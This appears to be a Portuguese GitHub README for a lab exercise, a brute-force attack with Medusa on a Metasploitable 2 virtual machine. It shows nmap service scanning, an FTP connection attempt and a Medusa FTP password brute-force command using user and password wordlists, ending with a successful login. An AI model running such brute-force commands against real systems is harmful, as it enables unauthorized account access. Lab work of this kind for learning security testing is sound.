# Simulando-ataque-brute-force-com-Medusa


> Laboratório: Bruteforce com Medusa contra Metasploitable 2


---


## 1) VM — Imagem da máquina


![Metasploitable 2 — VM vulnerável](images/Maquina%20Vulneravel.png "Metasploitable 2 VM")
*Captura da máquina Metasploitable 2 utilizada no laboratório.*


---


## 2) Reconhecimento — Nmap


**Objetivo:** identificar portas e versões de serviços


![Nmap — portas e serviços identificados](images/Escaneando%20maquina%20vunenavel%20com%20NMAP.png "Nmap scan")
*Figura 2 — Resultado do scan Nmap (ex.: portas 21, 22, 80, 139, 445 com versões de serviços).*

**Comando usado:**

```bash
nmap -sV -p 192.168.56.103

````

## 3) Conectando no FTP sem saber a senha

![Conectando na maquina sem conhecimento da senha](images/Conectando%20o%20FTP%20na%20maquina%20vulneravel.png "Conectando no FTP sem saber a senha")

**Comando usado:**

```bash
ftp 192.168.56.103
````

## 4) Utilizando Medusa para brute force

![Utilizando Medusa](images/Utilizando%20Medusa%20para%20ataque%20de%20brute%20force%20com%20uma%20pequena%20wordlist.png "Medusa brute force")

**Comando usado:**

```bash
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
````

## 5) Conectando no FTP da máquina vulnerável com usuario e senha descobertos pela wordlist utilizando Medusa

![Conectando no FTP com usuario e senha descobertos](images/Entrada%20com%20sucesso.png "Conectado ao FTP com sucesso")

